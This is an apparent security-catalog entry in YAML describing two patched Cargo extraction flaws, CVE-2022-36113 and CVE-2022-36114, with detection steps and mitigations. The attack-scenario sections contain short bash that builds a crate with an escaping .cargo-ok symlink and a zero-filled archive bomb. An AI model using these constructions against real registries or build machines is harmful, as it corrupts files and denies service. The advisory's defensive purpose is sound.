---
name: "Cargo Alternate-Registry Extraction Attacks"
packageManager: "cargo"
slug: "cargo-extraction-attacks"
category: "Supply Chain"
severity: "medium"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Cargo versions before Rust 1.64 accepted two malformed archive patterns from alternate registries. CVE-2022-36113 allowed a crate-supplied .cargo-ok symlink to redirect Cargo's final two-byte \"ok\" write and corrupt one file. CVE-2022-36114 allowed an archive to expand without a size limit and exhaust disk space. crates.io users were not affected because crates.io already rejected these packages."
descriptionCitations: [1, 2, 3, 4]
prerequisites:
  - "Ability to publish a crafted crate to an alternate Cargo registry that accepts malformed archives"
  - "The victim must use Cargo older than Rust 1.64 and download the crate from that registry"
  - "For CVE-2022-36113: the target filesystem must support symbolic links"
prerequisitesCitations: [1, 2, 3, 4]
attackScenarios:
  - title: "Symlink-Directed Two-Byte File Corruption (CVE-2022-36113)"
    description: "An attacker crafts a crate whose .cargo-ok entry is a symbolic link to a file outside the extraction directory. After extraction, vulnerable Cargo writes the two bytes \"ok\" through that link, replacing the target file's first two bytes. This corrupts one chosen file but does not provide an arbitrary-length write."
    citations: [1, 2, 3, 4]
    commands:
      - label: "Conceptual attack: crafting a crate with a malicious symlink"
        code: |
          # The attacker manually constructs a .crate tarball
          # containing a symlink that escapes the extraction directory

          mkdir -p evil-crate-0.1.0/src
          echo 'fn main() {}' > evil-crate-0.1.0/src/main.rs
          cat > evil-crate-0.1.0/Cargo.toml << 'EOF'
          [package]
          name = "evil-crate"
          version = "0.1.0"
          edition = "2021"
          EOF

          # Vulnerable Cargo writes "ok" to .cargo-ok after extraction.
          cd evil-crate-0.1.0
          ln -s ../../../target-file .cargo-ok

          # Package into a tarball (bypassing normal cargo package)
          cd ..
          tar czf evil-crate-0.1.0.crate evil-crate-0.1.0/
        language: "bash"
      - label: "Vulnerable extraction from an alternate registry"
        code: |
          # Cargo downloads and extracts the crate to:
          # ~/.cargo/registry/src/<alternate-registry-hash>/evil-crate-0.1.0/
          #
          # Cargo follows .cargo-ok -> ../../../target-file and writes two bytes.
          # crates.io rejects this archive; exploitation requires an alternate registry.
          cargo fetch
        language: "bash"
  - title: "Disk Space Exhaustion via Archive Bomb (CVE-2022-36114)"
    description: "An attacker uploads to an alternate registry a crate whose compressed archive expands to a much larger size. Cargo before Rust 1.64 imposed no extraction-size limit, so downloading the crate could exhaust disk space. crates.io already rejected such packages."
    citations: [1, 2, 3, 4]
    commands:
      - label: "Conceptual archive bomb construction"
        code: |
          # Create a file with highly repetitive content that compresses well
          # A few KB compressed can expand to many GB
          dd if=/dev/zero bs=1M count=10240 > evil-crate-0.1.0/src/data.bin
          # The resulting .crate file is small but extracts to 10GB+
          tar czf evil-crate-0.1.0.crate evil-crate-0.1.0/
        language: "bash"
      - label: "Victim's build fails due to disk exhaustion"
        code: |
          cargo build
          # Error: No space left on device
          # The CI/CD runner or developer machine runs out of disk
        language: "bash"
detection:
  - title: "Check Cargo version for known patches"
    description: "Verify that Cargo comes from Rust 1.64.0 or later, which includes fixes for both extraction flaws."
    citations: [1, 2, 3, 4]
    commands:
      - code: "cargo --version"
        language: "bash"
  - title: "Monitor disk usage during builds"
    description: "Set up disk usage monitoring to detect sudden spikes during cargo build operations that could indicate an archive bomb."
    citations: [1, 2, 3, 4]
    commands:
      - code: |
          # Monitor disk usage in the cargo registry during builds
          watch -n 1 'du -sh ~/.cargo/registry/src/ 2>/dev/null'
        language: "bash"
  - title: "Scan for symlinks in extracted crates"
    description: "Check for unexpected symbolic links in the cargo registry source directory."
    citations: [1, 2, 3, 4]
    commands:
      - code: "find ~/.cargo/registry/src/ -type l -ls"
        language: "bash"
mitigation:
  - "Update Rust and Cargo to version 1.64.0 or later, which includes patches for both CVEs"
  - "Set disk quotas on build environments to limit the impact of archive bombs"
  - "Use containerized build environments with limited disk space allocation"
  - "Monitor disk usage in CI/CD pipelines and fail builds that exceed thresholds"
  - "Regularly audit the cargo registry cache for unexpected symlinks or large files"
mitigationCitations: [1, 2, 3, 4]
references:
  - title: "Rust Security Response WG - Cargo Extraction Advisories"
    url: "https://blog.rust-lang.org/2022/09/14/cargo-cves/"
  - title: "GHSA-wrrj-h57r-vx9p - Cargo extracting malicious crate symlinks"
    url: "https://github.com/advisories/GHSA-wrrj-h57r-vx9p"
  - title: "GHSA-rfj2-q3h3-hm5j - Cargo extracting archive bombs"
    url: "https://github.com/advisories/GHSA-rfj2-q3h3-hm5j"
  - title: "Rust 1.64.0 Release Notes"
    url: "https://blog.rust-lang.org/2022/09/22/Rust-1.64.0.html"
created: 2026-04-02
updated: 2026-10-14
---
